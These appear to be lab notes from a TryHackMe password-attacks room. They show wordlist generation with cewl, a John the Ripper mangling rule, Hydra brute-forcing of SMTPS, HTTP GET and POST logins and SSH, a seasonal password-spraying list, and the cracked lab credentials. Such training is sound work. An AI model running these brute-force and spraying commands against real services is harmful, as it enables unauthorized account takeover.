
```bash

cewl -m 8 -w clinic_wordlist.txt https://clinic.thmredteam.com/  

#vi /opt/john/john.conf
vi /etc/john/john.conf
"
[List.Rules:THM-Password-Attacks]
Az"[0–9][0–9]" ^[!@]
"
/sbin/john --wordlist=clinic_wordlist.txt --rules=THM-Password-Attacks --stdout > dict.lst

rhost=10.10.98.196
wordlist=dict.lst
user=pittman@clinic.thmredteam.com
hydra -l $user -P $wordlist smtps://$rhost -s 465 -v

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 11:55:27
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5250 login tries (l:1/p:5250), ~329 tries per task
[DATA] attacking smtps://10.10.98.196:465/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[465][smtp] host: 10.10.98.196   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00
[STATUS] attack finished for 10.10.98.196 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-26 11:55:45
```


**HTTP LOGIN**
```bash

rhost=10.10.98.196
hydra -l phillips -P clinic_wordlist.txt $rhost http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 


Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 12:06:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task
[DATA] attacking http-get-form://10.10.98.196:80/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php
[80][http-get-form] host: 10.10.98.196   login: phillips   password: Paracetamol
[STATUS] attack finished for 10.10.98.196 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-26 12:06:10

```

**HTTP LOGIN**
/login-post
```bash

rhost=10.10.98.196
hydra -l phillips -P dict.lst $rhost http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 

/sbin/john --wordlist=clinic_wordlist.txt --rules=Single-Extra --stdout > dict.lst
# had some trouble
```

PASSWORD SPRAYING
```bash
# Generate password list
for year in {2020..2021}; do 
    for char in '!' '@' '#' '$' '%' '^' '&' '*' '(' ')'; do 
        echo "Fall${year}${char}"
    done
done > passwords.txt

└─# cat passwords.txt 
Fall2020!
Fall2020@
Fall2020#
Fall2020$
Fall2020%
Fall2020^
Fall2020&
Fall2020*
Fall2020(
Fall2020)
Fall2021!
Fall2021@
Fall2021#
Fall2021$
Fall2021%
Fall2021^
Fall2021&
Fall2021*
Fall2021(
Fall2021)


rhost=10.10.98.196
hydra -L usernames.txt -P passwords.txt ssh://$rhost -t 4


```